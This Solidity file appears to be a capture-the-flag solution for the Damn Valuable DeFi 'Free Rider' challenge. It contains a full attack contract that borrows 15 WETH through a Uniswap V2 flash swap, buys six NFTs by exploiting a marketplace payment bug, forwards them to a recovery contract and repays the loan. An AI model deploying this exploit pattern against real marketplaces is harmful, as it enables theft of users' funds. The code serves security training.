// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderAttack is IERC721Receiver {
    WETH immutable weth;
    IUniswapV2Pair immutable pair;
    FreeRiderNFTMarketplace immutable marketplace;
    DamnValuableNFT immutable nft;
    address immutable recovery;
    address immutable player;
    uint256[] public tokenIds ;

    

    constructor(
        WETH _weth,
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        address _recovery,
        address _player
    ) {
        weth = _weth;
        pair = _pair;
        marketplace = _marketplace;
        nft = _nft;
        recovery = _recovery;
        player = _player;
    }

    function attack() external payable {
        // trigger flash loan via UniswapV2-style swap
        // we borrow 15 WETH (enough to buy 6 NFTs, assuming 2.5 ETH each)
        bytes memory data = abi.encode(15 ether);

        pair.swap(15 ether, 0, address(this), data);
        console.log("Borrow Successful");
    }

    // This is the Uniswap V2 flash loan callback
    function uniswapV2Call(address sender, uint amountToken0, uint amountToken1, bytes calldata data) external {
        console.log("Address:",  sender);  // The borrower address
        console.log("Address:",  address(this)); 

        console.log("Pair Address:",  address(pair)); 

        require(msg.sender == address(pair), "Only the pair address can call this functionality"); 
    
        console.log("Eth balance before borrowing: ", address(this).balance); 

        // unwrap WETH → ETH
        weth.withdraw(amountToken0); // unwraps 15 ETH

        // buy all 6 NFTs for a bugged price (will refund us most ETH back)
        for (uint256 i = 0; i < 6; i++) {
            tokenIds.push(i);
        }

        marketplace.buyMany{value: amountToken0}(tokenIds); // exploit

        console.log("NFT Balance before sending: ", nft.balanceOf(address(this)));

        // // send NFTs to recovery contract to claim bounty
        for (uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), recovery, i, abi.encode(player));
        }

        console.log("NFT Balance after sending: ", nft.balanceOf(address(this)));

        // wrap ETH again to repay flash loan
        uint fee = (amountToken0 * 3) / 997 + 1;
        console.log("Fee: ", fee); 
        uint repayAmount = amountToken0 + fee;  // 0.3% fee  + ((amountToken0 * 3) / 997) + 1;
        console.log("Repay Amount: ", repayAmount); 

        require(address(this).balance >= repayAmount, "Not enough ETH to wrap");
        weth.deposit{value: repayAmount}();

        weth.transfer(address(pair), repayAmount);

        console.log("Address ETH Balance after repayment: ", address(this).balance); 



    }

    // needed for receiving NFTs
    function onERC721Received(address, address, uint256, bytes memory) public pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // allow receiving ETH from WETH
    receive() external payable {}
}
